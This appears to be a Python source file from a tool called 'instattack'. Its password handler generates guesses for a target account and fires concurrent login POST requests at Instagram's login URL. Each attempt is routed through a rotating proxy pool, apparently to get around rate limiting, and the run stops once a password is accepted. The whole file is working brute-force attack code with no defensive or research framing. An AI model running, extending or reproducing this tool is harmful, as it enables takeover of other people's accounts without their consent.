from __future__ import absolute_import

import asyncio
import aiohttp
import collections

from instattack import settings
from instattack.lib import starting, starting_context
from instattack.exceptions import (
    ResultNotInResponse, InstagramResultError, NoPasswordsError)

from instattack.core.models import LoginAttemptContext, LoginContext
from instattack.core.utils import limit_on_success, limit_as_completed

from .base import PostRequestHandler


class PasswordHandler(PostRequestHandler):

    __name__ = 'Password Handler'

    def __init__(self, proxy_handler, limit=None, **kwargs):
        kwargs.setdefault('method', 'POST')
        super(PasswordHandler, self).__init__(proxy_handler, **kwargs)

        self.limit = limit

        self.results = asyncio.Queue()
        self.attempts = asyncio.Queue()
        self.passwords = asyncio.Queue()

        # Index for the current password and attempts per password.
        self.login_index = 0
        self.generated_index = 0
        self.attempts_index = collections.Counter()
        self.completed_index = 0

    async def run(self, loop, token):

        await self.prepopulate(loop)

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        with starting_context(self):
            # Make sure we are just returning the results from the login attempts
            # method, or possibly the results consumption, depending.
            return await self.attempt_login(loop, token)

    @starting('Password Prepopulation')
    async def prepopulate(self, loop):
        futures = []
        async for password in self.user.generate_attempts(loop, limit=self.limit):
            futures.append(self.passwords.put(password))

        await asyncio.gather(*futures)
        if len(futures) == 0:
            raise NoPasswordsError()

        self.log.complete(f"Prepopulated {len(futures)} Password Attempts")

    async def login_task_generator(self, loop, session, token):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            password = await self.passwords.get()
            if password:
                self.log.critical('Creating Task!')
                context = LoginContext(
                    index=self.login_index,
                    token=token,
                    password=password
                )
                yield self.login_with_password(loop, session, context)
                self.login_index += 1

    async def login_attempt_task_generator(self, loop, session, login_context):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            # Temporary - Just until we can figure out what's going on.
            await asyncio.sleep(4)

            proxy = await self.proxy_handler.pool.get()
            # if proxy.unique_id in self.proxies_tried:
            #     self.log.error('Proxy already tried.', extra={'proxy': proxy})
            #     return
            if proxy:
                context = LoginAttemptContext(
                    index=self.attempts_index[login_context.password],
                    parent_index=login_context.index,
                    password=login_context.password,
                    token=login_context.token,
                    proxy=proxy,
                )
                yield self.login_request(loop, session, context, proxy)

                # Might need a lock here.
                self.attempts_index[login_context.password] += 1

    @starting('Login Requests')
    async def attempt_login(self, loop, token, batch_size=10):
        """
        ClientSession
        -------------
        When ClientSession closes at the end of an async with block (or through
        a direct ClientSession.close() call), the underlying connection remains
        open due to asyncio internal details. In practice, the underlying
        connection will close after a short while. However, if the event loop is
        stopped before the underlying connection is closed, an ResourceWarning:
        unclosed transport warning is emitted (when warnings are enabled).

        To avoid this situation, a small delay must be added before closing the
        event loop to allow any open underlying connections to close.
        <https://docs.aiohttp.org/en/stable/client_advanced.html>

        TODO:
        ----
        We might want to set a max_tries parameter on the limit_as_completed call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """
        async with aiohttp.ClientSession(
            connector=self._connector,
            timeout=self._timeout
        ) as session:
            async for result in limit_as_completed(self.login_task_generator(loop, session, token),
                    batch_size, stop_event=self.stop_event):

                if not result or not result.conclusive:
                    raise RuntimeError("Result should be valid and conslusive.")

                self.completed_index += 1
                self.log.info("{0:.2%}".format(
                    float(self.completed_index) / self.passwords.qsize()))
                await self.results.put(result)

                if result.authorized:
                    self.stop_event.set()
                    break

                self.log.error("Not Authenticated", extra={'password': result.context.password})
                await self.attempts.put(result.context.password)

        # await asyncio.sleep(0)

    async def login_with_password(self, loop, session, context, batch_size=5):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.

        TODO:
        ----
        We might want to set a max_tries parameter on the limit_on_success call
        so we don't wind up making the same request hundreds of times if we run
        into issues.
        """
        return await limit_on_success(
            self.login_attempt_task_generator(loop, session, context), batch_size)

    async def login_request(self, loop, session, context, proxy):
        """
        TODO
        ----
        We might want to incorporate handling of a "Too Many Requests" exception
        that is smarter and will notify the handler to use a different proxy and
        note the time.
        """
        self.log.debug('Login Request', extra={'context': context})
        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                # Only Http Proxies Are Supported by AioHTTP?  But maybe only for GET requests?
                proxy=proxy.https_url
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    result = await self._handle_client_response(response, context)

                except ResultNotInResponse as e:
                    # loop.call_soon(self.add_proxy_error, proxy, e)
                    self.log.error(e, extra={'response': response, 'context': context})

                else:
                    try:
                        result = await self._handle_parsed_result(result, context)

                    except InstagramResultError as e:
                        # loop.call_soon(self.add_proxy_error, proxy, e)
                        self.log.error(e, extra={'response': response, 'context': context})

                    else:
                        if not result:
                            raise RuntimeError("Result should not be None here.")

                        # TODO: Note success of proxy.
                        # loop.call_soon(self.maintain_proxy, proxy)
                        return result

        # TODO: For certain situations, we might want to mark the proxy as invalid,
        # so that we can still put it back in the pool so it will not be lost but
        # we don't want to reuse it.  Have to branch out of the add_proxy_error
        # method so that we can add the error but mark it as invalid/not
        except RuntimeError as e:
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            # loop.call_soon(self.add_proxy_error, proxy, e)
            self.log.error(e, extra={'context': context})

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            # Situation in which we would want to mark proxy as invalid.
            # loop.call_soon(self.add_proxy_error, proxy, e)
            self.log.error(e, extra={'context': context})

        except asyncio.TimeoutError as e:
            # Situation in which we would want to mark proxy as invalid.
            # loop.call_soon(self.add_proxy_error, proxy, e)
            self.log.error(e, extra={'context': context})

        except aiohttp.ClientConnectionError as e:
            # Situation in which we would want to mark proxy as invalid.
            # loop.call_soon(self.add_proxy_error, proxy, e)
            self.log.error(e, extra={'context': context})

        except OSError as e:
            # We have only seen this for the following:
            # >>> OSError: [Errno 24] Too many open files -> Want to sleep
            # >>> OSError: [Errno 54] Connection reset by peer
            if e.errno == 54:
                # Not sure if we should maintain proxy or not?
                # loop.call_soon(self.add_proxy_error, proxy, e)
                self.log.error(e, extra={'context': context})

            elif e.errno == 24:
                asyncio.sleep(3)
                self.log.error(e, extra={
                    'context': context,
                    'other': f'Sleeping for {3} seconds...'
                })
                # loop.call_soon(self.maintain_proxy, proxy)
            else:
                raise e

        except asyncio.CancelledError as e:
            # Do we want to do this?
            # loop.call_soon(self.maintain_proxy, proxy)
            pass

        except aiohttp.ClientError as e:
            # For whatever reason these errors don't have any message...
            if e.status == 429:
                e.message = 'Too many requests.'
                # Probably want to handle this error more specifically.
                # loop.call_soon(self.add_proxy_error, proxy, e)
                self.log.error(e, extra={'context': context})
            else:
                # loop.call_soon(self.add_proxy_error, proxy, e)
                self.log.error(e, extra={'context': context})

    async def save(self, loop):
        self.log.info('Dumping Password Attempts')
        self.log.critical('Have to make sure were not saving a successful password.')
        return await self.user.write_attempts(self.attempts)
